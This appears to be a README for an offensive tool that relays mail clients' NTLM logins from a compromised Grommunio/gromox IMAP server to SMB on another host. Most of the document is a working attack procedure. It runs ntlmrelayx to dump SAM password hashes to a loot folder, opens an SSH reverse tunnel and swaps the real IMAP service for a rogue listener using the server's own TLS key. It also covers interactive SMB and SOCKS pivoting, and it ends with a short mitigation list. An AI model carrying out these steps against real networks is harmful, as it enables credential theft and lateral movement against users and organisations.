# IMAP → SMB NTLM Relay (Grommunio / gromox)

Cross-protocol NTLM relay. When a mail client authenticates to a Grommunio/gromox
IMAP server with **NTLM**, and you control that server, you can turn the IMAP
endpoint into a relay that forwards the client's NTLM authentication to **SMB on
another host** — giving you an authenticated session there as that user.

> For authorized security testing only (your own systems or an engagement with
> written permission).

---

## Scenario

- You are **root on the mail server** (gromox IMAP), so you hold its real TLS
  cert/key and can replace the IMAP listener.
- A client/poller connects to that server every so often and logs in over
  **IMAP + STARTTLS** using **NTLM** as a domain user.
- A second host exposes **SMB with signing disabled** → it is a valid relay
  target. The relayed identity is a *user* going to a *different* host, so there
  is no same-host NTLM reflection block.

Example hosts used below:

| Host | Role |
|------|------|
| `MAILSRV` (`172.16.20.10`) | Owned gromox IMAP server (we are root) |
| `TARGET`  (`172.16.20.15`) | SMB relay target, signing disabled |
| `ATTACKER` (`10.10.14.223`) | Runs ntlmrelayx |

gromox TLS material (default paths):
`/etc/grommunio-common/ssl/server-bundle.pem` and `server.key`.

---

## Files

| File | Runs on | Purpose |
|------|---------|---------|
| `imap_capture.py` | MAILSRV | Rogue IMAP server: real-cert STARTTLS, advertises `AUTH=NTLM`, bridges NTLMSSP Type 1/2/3 to a relay backend. `--raw` mode speaks impacket ntlmrelayx's RAW server. |
| `relay_wrapper.sh` | MAILSRV | Stops `gromox-imap` to free port 143, runs `imap_capture.py`, restarts the service on exit. |

---

## Steps

### 1. Start ntlmrelayx (RAW server only), target the SMB host
No `-c` → the SMB attack dumps SAM hashes to `loot/`.
```bash
impacket-ntlmrelayx -t smb://172.16.20.15 -smb2support \
  --no-smb-server --no-http-server --no-wcf-server --no-rpc-server --no-winrm-server \
  --raw-port 6666 -l loot -dh
```

### 2. Reverse-tunnel so MAILSRV can reach the relay
If MAILSRV has no route back to the attacker IP, forward the RAW port over SSH:
```bash
ssh root@172.16.20.10 -N -R 127.0.0.1:6666:127.0.0.1:6666
```

### 3. Run the rogue IMAP relay on MAILSRV
Third arg = RAW port → enables `--raw` and points capture at the tunnel:
```bash
./relay_wrapper.sh 127.0.0.1 143 6666
```
This stops `gromox-imap`, binds the rogue server on `:143`, and restores the
service on Ctrl-C.

### 4. Wait for the next client login
`imap_capture.py` logs `CONNECTED → STARTTLS → AUTHENTICATE NTLM → Type1 → Type3`.
ntlmrelayx logs:
```
[*] Authenticating against smb://172.16.20.15 as <DOMAIN>/<USER> SUCCEED
[*] Dumping local SAM hashes ...
```
Hashes land in `loot/`.

### 5. If the relayed user is not a local admin on the target
secretsdump returns `rpc_s_access_denied`. Swap the attack instead of dumping:
```bash
# interactive smbclient over the relayed session
... --raw-port 6666 -i
# or a SOCKS proxy to drive the session with any tool
... --raw-port 6666 -socks
```

### 6. Cleanup
Ctrl-C the wrapper (auto-restarts `gromox-imap`); stop the tunnel and ntlmrelayx.

---

## How the bridge works

`imap_capture.py` serves just enough IMAP to reach authentication: greeting →
`STARTTLS` (wrapped with the real cert) → `CAPABILITY` advertising `AUTH=NTLM` →
`AUTHENTICATE NTLM`. It extracts the base64 NTLMSSP **Type 1** (handling SASL-IR
inline responses), returns the **Type 2** challenge it gets from the SMB target,
takes the client's **Type 3**, and forwards it to complete authentication. The
RAW backend framing is `<len:int16><Type1>` → `<len:int16><Type2>` →
`<len:int16><Type3>` → `<len:int16=1><ok:bool>` (impacket `rawrelayserver.py`).

## Mitigation

- Enable **SMB signing** on all hosts — this alone defeats SMB relay.
- Enforce **channel binding / EPA** on TLS-fronted services so relayed NTLM is
  rejected.
- Prefer Kerberos; disable NTLM where possible.
- Alert on the mail service restarting and on logons from the mail server's IP to
  workstations.
